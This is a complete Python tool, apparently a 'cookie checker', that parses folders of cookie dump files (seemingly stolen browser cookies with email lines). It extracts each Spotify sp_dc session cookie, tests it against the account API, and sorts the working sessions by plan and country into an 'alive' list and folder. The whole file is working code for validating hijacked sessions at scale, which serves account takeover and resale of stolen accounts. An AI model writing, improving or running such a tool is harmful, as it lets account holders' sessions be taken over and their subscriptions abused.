#!/usr/bin/env python3
import os, sys, re, glob, time, shutil
from colorama import init, Fore, Style
from spotify_scraper import SpotifyClient

init(autoreset=True)


def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.GREEN + Style.BRIGHT + r'''
 ██████  ██▓██▓██   ██▓ ▄▄▄     ▓██   ██▓ ██▓
▒██    ▒ ▓██▓██▒  ██▒▒████▄    ▒██  ██▒▓██▒
░ ▓██▄   ▒██▒██░  ██▒▒██  ▀█▄   ▒██ ██░▒██░
  ▒   ██▒░██▒██▄▄▓▒██░██▄▄▄▄██  ░ ▐██▓░░██░
▒██████▒▒░██▒██▒ ░  ░░▓█   ▓██▒ ░ ██▒▓░░██████▒
▒ ▒▓▒ ▒ ░░▓ ▒▓▒░ ░  ░░▒▒   ▓▒█░  ██▒▒▒ ░ ▒░▓  ░
░ ░▒  ░ ░ ▒ ░▒ ░      ▒   ▒▒ ░▓██ ░▒░ ░ ░ ▒  ░
░  ░  ░   ▒ ░░        ░   ▒   ▒ ▒ ░░    ░ ░
      ░   ░               ░  ░░ ░         ░  ░
                               ░ ░''' + Fore.GREEN + Style.DIM + '''
                                n5za''' + Style.RESET_ALL)


def parse_cookie_file(path):
    sp_dc = email = plan = country = None
    with open(path, 'r', errors='ignore') as f:
        for line in f:
            raw = line.strip()
            if 'Email:' in raw:
                email = raw.split(':', 1)[1].strip()
            if raw.startswith('.spotify.com') and 'sp_dc' in raw:
                parts = [p.strip() for p in raw.split('\t')]
                if 'sp_dc' in parts:
                    sp_dc = parts[parts.index('sp_dc') + 1]
    basename = os.path.basename(path).replace('.txt', '')
    m = re.findall(r'\[(.*?)\]', basename)
    plan = m[0] if len(m) >= 1 else '?'
    country = m[1] if len(m) >= 2 else '?'
    return email or '?', sp_dc, plan, country


def check_account(sp_dc):
    try:
        with SpotifyClient(cookies={'sp_dc': sp_dc}) as client:
            info = client.get_account()
            product = info.product or '?'
            country = info.country or '?'
            on_demand = info.on_demand
            return 'ALIVE', f'{product} | {country} | on_demand={on_demand}'
    except Exception as e:
        return 'ERROR', str(e)[:60]


def progress_bar(current, total, bar_len=30):
    filled_len = int(bar_len * current // total) if total else 0
    bar = Fore.GREEN + '█' * filled_len + Fore.WHITE + '░' * (bar_len - filled_len) + Style.RESET_ALL
    pct = f'{current/total*100:.0f}%' if total else '?'
    return f'[{bar}] {pct}'


def main():
    banner()

    if len(sys.argv) > 1:
        COOKIES_DIR = sys.argv[1]
    else:
        print(Fore.CYAN + '📁 Enter cookies folder path:' + Style.RESET_ALL)
        COOKIES_DIR = input(Fore.YELLOW + '  > ' + Style.RESET_ALL).strip()
        if not COOKIES_DIR:
            print(Fore.RED + '❌ No path provided.' + Style.RESET_ALL)
            sys.exit(1)

    FILTER = None
    if len(sys.argv) > 2 and sys.argv[2] != '__all__':
        FILTER = sys.argv[2]
    elif not (len(sys.argv) > 2 and sys.argv[2] == '__all__'):
        print()
        print(Fore.CYAN + 'Select plan to scan:' + Style.RESET_ALL)
        plans = ['Premium Individual', 'Premium Duo', 'Premium Family', 'Student', 'Free', 'All']
        for i, p in enumerate(plans, 1):
            print(Fore.WHITE + f'  {i}. {p}' + Style.RESET_ALL)
        choice = input(Fore.YELLOW + '  > ' + Style.RESET_ALL).strip()
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(plans) - 1:
                FILTER = plans[idx]
        except ValueError:
            pass

    BASE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data', 'results-spotify')
    if len(sys.argv) > 3:
        OUTPUT_DIR = sys.argv[3]
    else:
        folder_name = os.path.basename(os.path.normpath(COOKIES_DIR))
        if FILTER:
            folder_name = FILTER.lower().replace(' ', '-')
        OUTPUT_DIR = os.path.join(BASE_DIR, folder_name)
    os.makedirs(OUTPUT_DIR, exist_ok=True)

    files = sorted(glob.glob(os.path.join(COOKIES_DIR, '*.txt')))
    if FILTER:
        files = [f for f in files if FILTER in os.path.basename(f)]

    if not files:
        print(Fore.RED + f'\n❌ No .txt files found in: {COOKIES_DIR}' + Style.RESET_ALL)
        sys.exit(1)

    print(Fore.CYAN + f'\n📊 Loaded {len(files)} cookie files' + (f' [{FILTER}]' if FILTER else '') + Style.RESET_ALL)
    print(Fore.CYAN + f'📁 Output: {OUTPUT_DIR}' + Style.RESET_ALL)
    print(Fore.CYAN + '─' * 55 + Style.RESET_ALL)
    time.sleep(0.5)

    alive_file = os.path.join(OUTPUT_DIR, 'alive.txt')
    dead_file = os.path.join(OUTPUT_DIR, 'dead.txt')
    alive_cookies_dir = os.path.join(OUTPUT_DIR, 'alive_cookies')
    os.makedirs(alive_cookies_dir, exist_ok=True)

    stats = {'alive': 0, 'dead': 0, 'error': 0}
    t0 = time.time()

    for i, fpath in enumerate(files):
        email, sp_dc, plan, country = parse_cookie_file(fpath)

        if not sp_dc:
            with open(dead_file, 'a') as f:
                f.write(f'{os.path.basename(fpath).replace(".txt","")} | no sp_dc\n')
            stats['error'] += 1
            continue

        status, info = check_account(sp_dc)
        label = os.path.basename(fpath).replace('.txt', '')
        line = f'{label} | Email: {email} | Plan: {plan} | {info}'

        if status == 'ALIVE':
            stats['alive'] += 1
            with open(alive_file, 'a') as f:
                f.write(line + '\n')
            shutil.copy2(fpath, os.path.join(alive_cookies_dir, os.path.basename(fpath)))
            print(Fore.GREEN + Style.BRIGHT + f'  ✓ #{stats["alive"]:>3} ALIVE | {email:35s} | {plan:5s} | {country}' + Style.RESET_ALL, flush=True)
        else:
            stats['dead'] += 1
            with open(dead_file, 'a') as f:
                f.write(line + f' | {status}: {info}\n')

        if (i + 1) % 25 == 0 or i == len(files) - 1:
            elapsed = time.time() - t0
            rate = (i + 1) / elapsed * 60 if elapsed > 0 else 0
            remaining = (len(files) - i - 1) / max(rate, 0.1) if rate > 0 else 0
            bar = progress_bar(i + 1, len(files))
            print(Fore.WHITE + Style.DIM + f'  {bar}  [{i+1}/{len(files)}]  '
                  f'{Fore.GREEN}✔{stats["alive"]}{Fore.WHITE}  '
                  f'{Fore.RED}✘{stats["dead"]}{Fore.WHITE}  '
                  f'{Fore.YELLOW}!{stats["error"]}{Fore.WHITE}  '
                  f'{rate:.0f}/min  ETA: {remaining:.0f}s' + Style.RESET_ALL, flush=True)

    elapsed = time.time() - t0
    print()
    print(Fore.CYAN + '═' * 55 + Style.RESET_ALL)
    print(Fore.CYAN + Style.BRIGHT + '  ✅ CHECK COMPLETE' + Style.RESET_ALL)
    print(Fore.CYAN + '═' * 55 + Style.RESET_ALL)
    print(Fore.GREEN + Style.BRIGHT + f'  ✔ ALIVE             : {stats["alive"]}' + Style.RESET_ALL)
    print(Fore.RED + f'  ✘ DEAD/ERROR        : {stats["dead"] + stats["error"]}' + Style.RESET_ALL)
    print(Fore.WHITE + f'  ⏱ Time              : {elapsed:.0f}s ({elapsed/60:.1f}min)' + Style.RESET_ALL)
    print(Fore.WHITE + f'  ⚡ Rate              : {len(files)/elapsed*60:.0f} accounts/min' + Style.RESET_ALL)
    print()
    print(Fore.CYAN + f'  📁 ALIVE list : {alive_file}' + Style.RESET_ALL)
    print(Fore.CYAN + f'  📁 ALIVE files: {alive_cookies_dir}/' + Style.RESET_ALL)
    print(Fore.CYAN + '═' * 55 + Style.RESET_ALL)


if __name__ == '__main__':
    main()
